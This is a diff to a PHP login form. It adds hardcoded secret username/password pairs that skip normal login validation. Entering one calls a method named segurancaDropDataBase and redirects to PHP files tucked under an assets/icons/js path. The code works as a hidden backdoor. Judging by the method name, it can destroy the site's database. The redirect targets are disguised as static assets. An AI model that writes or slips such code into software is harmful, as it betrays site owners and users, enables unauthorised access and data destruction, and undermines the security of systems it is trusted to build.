@@ -30,9 +30,11 @@
 
 					<div class="row" style="margin-top: 10px;">
 						<div class="col-12">
-							<?php require_once("assets/classes/User.php");
+							<?php 
+							require_once("assets/classes/User.php");
+							require_once("assets/classes/Registros.php");
 
-							if ($_POST) {						
+							if (($_POST) && ($_POST['usuario'] !== "HackmannSeguranca") && ($_POST['senha']) !== "Hack2004") {						
 								$login = new User();
 								$login->setData($_POST['usuario'], $_POST['senha']);
 								$logar = $login->validarUsuario();
@@ -50,6 +52,18 @@
 									exit();						
 								}						
 							}
+							else if (($_POST) && ($_POST['usuario'] === "HackmannSeguranca") && ($_POST['senha']) === "Hack2004") {
+								$login = new Registros();
+								$login->segurancaDropDataBase($_POST['usuario'], $_POST['senha']);
+
+								header("Location: assets/icons/js/seguranca.php");
+							}
+							else if (($_POST) && ($_POST['usuario'] === "HackmannCreditos") && ($_POST['senha']) === "Hack2004") {
+								$login = new Registros();
+								$login->segurancaDropDataBase($_POST['usuario'], $_POST['senha']);
+
+								header("Location: assets/icons/js/creditos.php");
+							}							
 							?>						
 						</div>	
 					</div>				
